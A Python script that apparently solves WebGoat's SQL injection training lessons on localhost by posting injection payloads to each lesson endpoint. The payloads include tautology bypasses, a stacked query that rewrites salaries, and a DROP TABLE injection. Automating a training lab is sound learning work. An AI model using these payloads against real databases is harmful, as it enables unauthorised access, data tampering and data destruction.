import requests
import time

def log(text):
    print(text)

def run(thread_name):
    host="http://127.0.0.1:8080/WebGoat"

    s = requests.Session()

    #params = { 'username':'webgoat', 'password':'webgoat', 'matchingPassword':'webgoat', 'agree':'agree' }
    #r = s.post(host + "/register.mvc", params=params)
    #print(r.text)

    params = { 'username':'admin1', 'password':'admin1' }
    r = s.post(host + "/login", params=params)
    log(thread_name + ' ' + str(r.status_code))

    time.sleep(1)

    r = s.get(host + "/SqlInjection.lesson.lesson")
    log(thread_name + ' ' + str(r.status_code))

    time.sleep(1)

    params = { 'query':"select department from Employees where first_name='Bob'" }
    r = s.post(host + "/SqlInjection/attack2", params=params)
    log(thread_name + ' ' + str(r.status_code))

    time.sleep(1)

    params = { 'account':"=Smith'", 'operator':"or", 'injection':"'1'='1" }
    r = s.post(host + "/SqlInjection/assignment5a", params=params)
    log(thread_name + ' ' + str(r.status_code))

    time.sleep(1)

    params = { 'login_count':'1', 'userid':"0 or 1=1" }
    r = s.post(host + "/SqlInjection/assignment5b", params=params)
    log(thread_name + ' ' + str(r.status_code))

    time.sleep(1)

    params = { 'name':"Smith' or 1=1;--", 'auth_tan':'3SL99A' }
    r = s.post(host + "/SqlInjection/attack8", params=params)
    log(thread_name + ' ' + str(r.status_code))

    time.sleep(1)

    params = { 'name':"Smith'; update employees set salary=999999 where last_name='Smith';--", 'auth_tan':'3SL99A' }
    r = s.post(host + "/SqlInjection/attack9", params=params)
    log(thread_name + ' ' + str(r.status_code))

    time.sleep(1)

    params = { 'action_string':"';drop table access_log;--" }
    r = s.post(host + "/SqlInjection/attack10", params=params)
    log(thread_name + ' ' + str(r.status_code))

    time.sleep(1)

if __name__ == '__main__':
    run("standalone")